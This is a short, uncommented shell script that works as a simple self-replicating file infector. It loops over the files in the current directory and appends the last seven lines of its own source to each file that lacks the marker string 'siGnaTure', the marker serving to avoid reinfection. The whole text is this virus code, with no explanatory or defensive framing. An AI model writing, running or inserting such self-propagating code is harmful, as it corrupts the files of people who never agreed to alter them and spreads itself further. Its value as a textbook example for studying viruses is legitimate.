for k in *;do
	if [ "./$k" != "$0" ]; then
		if [ -z $(cat $k | grep "siGnaTure") ] 2>/dev/null;then
			tail -n 7 $0 | cat >> $k
		fi
	fi
done
